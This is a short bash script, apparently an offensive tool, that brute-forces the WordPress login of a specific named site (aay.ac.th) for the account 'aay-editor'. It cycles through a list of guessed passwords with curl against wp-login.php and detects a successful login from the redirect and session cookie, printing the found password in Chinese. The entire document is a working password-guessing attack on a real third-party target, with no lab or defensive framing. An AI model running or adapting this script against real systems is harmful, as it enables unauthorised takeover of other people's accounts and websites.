#!/bin/bash
TARGET="https://aay.ac.th"
USER="aay-editor"

PASSWORDS=(
    "aay-editor" "aayeditor" "AayEditor" "editor" "Editor123"
    "aay123" "aay2024" "aay2025" "Aay@2024" "Aay@2025"
    "editor2024" "Editor2024" "Editor@2024" "editor123"
    "password" "Password123" "admin123" "Admin123"
)

echo "[+] 测试用户: $USER"
for pass in "${PASSWORDS[@]}"; do
    echo -n "[*] $pass ... "
    curl -sk "$TARGET/wp-login.php" -c /tmp/ed.txt -o /dev/null 2>&1
    RESPONSE=$(curl -sk "$TARGET/wp-login.php" -X POST -b /tmp/ed.txt -c /tmp/ed_r.txt \
        -d "log=$USER&pwd=$pass&wp-submit=Log+In" -D /tmp/ed_h.txt -o /tmp/ed_b.html -w "%{http_code}" 2>&1)
    
    if [ "$RESPONSE" = "302" ] && grep -qi "wp-admin" /tmp/ed_h.txt && grep -qi "wordpress_logged_in" /tmp/ed_r.txt; then
        echo "✅ 成功！密码: $pass"
        exit 0
    fi
    echo "❌"
    sleep 1
done
